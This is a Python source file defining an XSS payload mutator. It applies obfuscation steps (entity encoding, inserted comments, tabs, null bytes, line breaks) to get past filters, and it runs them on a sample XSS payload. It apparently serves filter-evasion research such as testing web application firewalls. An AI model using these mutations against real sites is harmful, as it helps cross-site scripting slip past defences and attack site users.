#-*- coding:utf-8 –*-


import numpy as np
import re
import random



class Xss_Manipulator(object):
    def __init__(self):
        self.dim = 0
        self.name=""

#常见免杀动作：
    # 随机字符转16进制 比如： a转换成&#x61；
    # 随机字符转10进制 比如： a转换成&#97；
    # 随机字符转10进制并假如大量0 比如： a转换成&#000097；
    # 插入注释 比如： /*abcde*/
    # 插入Tab
    # 插入回车
    # 开头插入空格 比如： /**/
    # 大小写混淆
    # 插入 \00 也会被浏览器忽略

    ACTION_TABLE = {
    #'charTo16': 'charTo16',
    #'charTo10': 'charTo10',
    #'charTo10Zero': 'charTo10Zero',
    'addComment': 'addComment',
    'addTab': 'addTab',
    'addZero': 'addZero',
    'addEnter': 'addEnter',
    }

    def charTo16(self,str,seed=None):
        #print "charTo16"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #print "search --> matchObj.group() : ", matchObjs
            modify_char=random.choice(matchObjs)
            #字符转ascii值ord(modify_char
            #modify_char_10=ord(modify_char)
            modify_char_16="&#{};".format(hex(ord(modify_char)))
            #print "modify_char %s to %s" % (modify_char,modify_char_10)
            #替换
            str=re.sub(modify_char, modify_char_16, str,count=random.randint(1,3))




        return str

    def charTo10(self,str,seed=None):
        #print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #print "search --> matchObj.group() : ", matchObjs
            modify_char=random.choice(matchObjs)
            #字符转ascii值ord(modify_char
            #modify_char_10=ord(modify_char)
            modify_char_10="&#{};".format(ord(modify_char))
            #print "modify_char %s to %s" % (modify_char,modify_char_10)
            #替换
            str=re.sub(modify_char, modify_char_10, str)

        return str

    def charTo10Zero(self,str,seed=None):
        #print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #print "search --> matchObj.group() : ", matchObjs
            modify_char=random.choice(matchObjs)
            #字符转ascii值ord(modify_char
            #modify_char_10=ord(modify_char)
            modify_char_10="&#000000{};".format(ord(modify_char))
            #print "modify_char %s to %s" % (modify_char,modify_char_10)
            #替换
            str=re.sub(modify_char, modify_char_10, str)

        return str

    def addComment(self,str,seed=None):
        #print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            #modify_char_comment="{}/*a{}*/".format(modify_char,modify_char)
            modify_char_comment = "{}/*8888*/".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_comment, str)

        return str

    def addTab(self,str,seed=None):
        #print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            modify_char_tab="   {}".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_tab, str)

        return str

    def addZero(self,str,seed=None):
        #print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            modify_char_zero="\\00{}".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_zero, str)

        return str


    def addEnter(self,str,seed=None):
        #print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            modify_char_enter="\\r\\n{}".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_enter, str)

        return str

    def modify(self,str, _action, seed=6):

        print "Do action :%s" % _action
        action_func=Xss_Manipulator().__getattribute__(_action)

        return action_func(str,seed)


if __name__ == '__main__':
    f=Xss_Manipulator()
    a=f.modify("><h1/ondrag=confirm`1`)>DragMe</h1>","charTo10")
    print a

    b=f.modify("><h1/ondrag=confirm`1`)>DragMe</h1>","charTo16")
    print b